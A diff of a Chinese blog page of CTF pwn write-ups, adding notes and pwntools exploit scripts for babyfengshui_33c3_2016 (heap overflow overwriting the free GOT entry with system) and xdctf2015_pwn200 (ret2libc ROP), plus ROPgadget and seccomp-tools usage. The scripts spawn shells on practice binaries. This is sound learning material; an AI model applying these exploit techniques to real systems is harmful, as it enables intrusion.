@@ -202,7 +202,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      5.5k 字
+      6.3k 字
     </span>
   
 
@@ -212,7 +212,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      118
+      134
        分钟
     </span>
   
@@ -254,7 +254,7 @@
             
               <p class="note note-info">
                 
-                  不可视境界线最后变动于：3 分钟前
+                  不可视境界线最后变动于：11 小时前
                 
               </p>
             
@@ -332,8 +332,8 @@
 <p>之前刷题中用到的后门函数都是system(“/bin/sh”)，这次出现了一个新的后门：**execve()**。</p>
 <p>函数定义:<br>**int execve(const char *filename, char <em>const argv[ ], char <em>const envp[ ]);</em></em> </p>
 <p>寄存器eax放execve的系统调用号11；<br>寄存器ebx放文件路径，即第一个参数；<br>寄存器ecx放第二个参数，是利用数组指针把内容传递给执行文件，并且需要以空指针(NULL)结束；<br>寄存器edx放最后一个参数，为传递给执行文件的新环境变量数组。</p>
-<p>后两个参数一般为0</p>
-<p>int 0x80：中断<br>执行系统调用函数execve()时，execve()通过int 0x80指令进入系统调用入口程序，并且把系统调用号11放入eax中，接着把参数放入ebx，ecx和edx中。</p>
+<p><strong>后两个参数一般为0</strong> </p>
+<p>int 0x80：中断<br>执行系统调用函数execve()时，execve()通过int 0x80指令进入系统调用入口程序，并且把系统调用号11放入eax中，接着把参数放入ebx，ecx和edx中。如果没有/bin/sh字符串, 那么就先调用read函数读取”/bin/sh”, 尝试”sh”失败, 原因尚未知晓</p>
 <h2 id="11-2018-rop"><a href="#11-2018-rop" class="headerlink" title="11.2018_rop"></a>11.2018_rop</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">setresuid(); <br>setresgid();<br><span class="hljs-comment">//These two syscalls are like their equivalent kernels calls above, but with the additional ability to set the Saved-User-ID (SUID) or Saved-Group-ID (SGID). re represent</span><br></code></pre></td></tr></table></figure>
 
 <h2 id="12-ciscn-s-3"><a href="#12-ciscn-s-3" class="headerlink" title="12.ciscn_s_3"></a>12.ciscn_s_3</h2><ol>
@@ -470,7 +470,35 @@
 <p><strong>seccomp-tools</strong>用法:(<a target="_blank" rel="noopener" href="https://github.com/david942j/seccomp-tools">Github Page</a>)</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo gem install seccomp-tools<br>nevv@ubuntu:~/Desktop/seccomp-tools-master/bin$ seccomp-tools dump ../../pwn1<br> line  CODE  JT   JF      K<br>=================================<br> 0000: 0x20 0x00 0x00 0x00000004  A = arch<br> 0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011 # line11<br> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number<br> 0003: 0x35 0x07 0x00 0x40000000  if (A &gt;= 0x40000000) goto 0011 # 0011这个就是左边的标号<br> 0004: 0x15 0x06 0x00 0x00000002  if (A == open) goto 0011<br> 0005: 0x15 0x05 0x00 0x00000101  if (A == openat) goto 0011<br> 0006: 0x15 0x04 0x00 0x00000055  if (A == creat) goto 0011<br> 0007: 0x15 0x03 0x00 0x0000009d  if (A == prctl) goto 0011<br> 0008: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0011<br> 0009: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0011<br> 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW<br> 0011: 0x06 0x00 0x00 0x00051234  return ERRNO(4660)  #有任何一个不允许的系统调用出现时就反回errornumber<br></code></pre></td></tr></table></figure>
 
+<h2 id="19-babyfengshui-33c3-2016"><a href="#19-babyfengshui-33c3-2016" class="headerlink" title="19.babyfengshui_33c3_2016"></a>19.babyfengshui_33c3_2016</h2><blockquote>
+<p>在<a href="./glibc_malloc_srcCode.md#%E5%85%B3%E9%94%AE%E5%87%BD%E6%95%B0">源代码分析</a>中的关键函数部分提到过从几个功能函数推断出存储的结构体, 这次我没注意到这个细节, 属实是hacknote这题直接源码看一遍草草了事, 一些细节给我忽略了.</p>
+<p>善用<code>gdb.attach()</code>, 说实话这样子看堆的结构是最为直观的, 但是我又大意了, 环境和服务器的不一样也不能直接用</p>
+<p>还有一件事, 可以把一些自动生成的名称改一下, 这样子更好看源代码</p>
+</blockquote>
+<p>这题认认真真的分析了一遍源代码, 又花了将近一天的时间, 我也不知道为啥会这么慢</p>
+<ol>
+<li>首先从add函数中看出存数据的结构体是长这个样子的</li>
+</ol>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user</span>	//总共<span class="hljs-title">user_data</span>区有0<span class="hljs-title">x80</span>字节</span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">char</span> * description;<br>    <span class="hljs-keyword">char</span> name[<span class="hljs-number">0x7c</span>];<br>&#125;<br></code></pre></td></tr></table></figure>
 
+<p>​    而且先malloc description的size(用户输入)字节, 然后再malloc user的0x80字节<br>2. delete和display没有什么特别的, 稍微看一下就可以看出add中count变量(当然是自己改的名字)<br>3. 然后update有个很蠢的检验方法, 主要是他想着user和description是相邻的而且顺序也是一样的, 这样的话我们就可以使用没有tcache的glibc版本来绕过</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">char</span> *)(v3 + *(_DWORD *)*(&amp;ptr + a1)) &gt;= (<span class="hljs-keyword">char</span> *)*(&amp;ptr + a1) - <span class="hljs-number">4</span> )<br></code></pre></td></tr></table></figure>
+<ol start="4">
+<li>先申请三个chunk, 第三个存”/bin/sh”</li>
+<li>将free_got 地址覆盖在chunk 1的description指针上, 通过display函数打印出来</li>
+<li>通过LibcSearcher找出sys_addr</li>
+<li>改写chunk 1 的description内容为sys_addr, 实际上就是改写free_got为sys_addr</li>
+<li>调用delete(1)即可</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#from pwn import *</span><br><span class="hljs-comment">#from LibcSearcher import *</span><br><span class="hljs-comment">#context.binary = &#x27;./babyfengshui_33c3_2016&#x27;</span><br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><br>elf = ELF(<span class="hljs-string">&quot;babyfengshui_33c3_2016&quot;</span>)<br>free_got = elf.got[<span class="hljs-string">&quot;free&quot;</span>]<br>free_plt = elf.plt[<span class="hljs-string">&quot;free&quot;</span>]<br><br><span class="hljs-comment">#c = 0</span><br><span class="hljs-comment">#if c == 0:</span><br><span class="hljs-comment">#    p = remote(&quot;node4.buuoj.cn&quot;, 26834)</span><br><span class="hljs-comment">#else:</span><br><span class="hljs-comment">#    p = process(&quot;./babyfengshui_33c3_2016&quot;)</span><br><span class="hljs-comment">#</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,name,length,text</span>):</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span>(<span class="hljs-params">index</span>):</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">display</span>(<span class="hljs-params">index</span>):</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">update</span>(<span class="hljs-params">index,length,text</span>):</span><br><br>add(<span class="hljs-number">0x80</span>, <span class="hljs-string">&quot;a1&quot;</span>, <span class="hljs-number">0x80</span>, <span class="hljs-string">&quot; &quot;</span>)<br>add(<span class="hljs-number">0x80</span>, <span class="hljs-string">&quot;a2&quot;</span>, <span class="hljs-number">0x80</span>, <span class="hljs-string">&quot; &quot;</span>)<br>add(<span class="hljs-number">0x8</span>, <span class="hljs-string">&quot;a3&quot;</span>, <span class="hljs-number">0x8</span>, <span class="hljs-string">&quot;/bin/sh\x00&quot;</span>)<br><br>delete(<span class="hljs-number">0</span>)<br><br>add(<span class="hljs-number">0x100</span>, <span class="hljs-string">&quot;aa&quot;</span>, <span class="hljs-number">0x19c</span>, <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x198</span>+p32(free_got))<br><br>display(<span class="hljs-number">1</span>)<br>p.recvuntil(<span class="hljs-string">&quot;description: &quot;</span>)<br>free_addr = u32(p.recv(<span class="hljs-number">4</span>))<br><br>libc = LibcSearcher(<span class="hljs-string">&quot;free&quot;</span>, free_addr)<br>base = free_addr - libc.dump(<span class="hljs-string">&quot;free&quot;</span>)<br>system_addr = base + libc.dump(<span class="hljs-string">&quot;system&quot;</span>)<br><br>update(<span class="hljs-number">1</span>, <span class="hljs-number">0x8</span>, p32(system_addr))<br>delete(<span class="hljs-number">2</span>)<br>p.sendline(<span class="hljs-string">&quot;cat flag&quot;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h2 id="20-xdctf2015-pwn200"><a href="#20-xdctf2015-pwn200" class="headerlink" title="20.xdctf2015_pwn200"></a>20.xdctf2015_pwn200</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python">libc = ELF(<span class="hljs-string">&quot;libc-2.23.so&quot;</span>)<br>elf = ELF(<span class="hljs-string">&quot;bof&quot;</span>)<br><br><br>payload = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">112</span><br>payload += flat([elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>], elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>], <span class="hljs-number">1</span>, elf.got[<span class="hljs-string">&#x27;write&#x27;</span>], <span class="hljs-number">4</span>])<br><br>ru(<span class="hljs-string">b&#x27;5~!\n&#x27;</span>)<br>sl(payload)<br><br>write_addr = u32(rn(<span class="hljs-number">4</span>)[:])<br><br>base = write_addr - libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>sys_addr = base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh = base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>)) <span class="hljs-comment">#就是这里只能用bytes类型, 其他没什么可注意的了</span><br><br>payload = flat([<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">112</span>, sys_addr, elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>], binsh])<br>ru(<span class="hljs-string">b&#x27;5~!\n&#x27;</span>)<br>sl(payload)<br><br>sl(<span class="hljs-string">b&#x27;cat flag&#x27;</span>)<br><br>itt()<br></code></pre></td></tr></table></figure>
+
+<h2 id="21-inndy-rop"><a href="#21-inndy-rop" class="headerlink" title="21.inndy_rop"></a>21.inndy_rop</h2><p>这题非常之直接, 静态链接+数组定义gets函数, 摆明了就是利用ROP</p>
+<p>但是ROP比较长, 直接使用<code>ROPgadget --binary rop --ropchain</code>让它自动生成exploit</p>
+<p>复制粘贴, 然后完事了………</p>
+<p>唯一要注意的就是自动生成的是python2的语法, 如果有什么str类型的数据要把他变成bytes</p>
+<h2 id="22"><a href="#22" class="headerlink" title="22."></a>22.</h2>
             </div>
             <hr>
             <div>
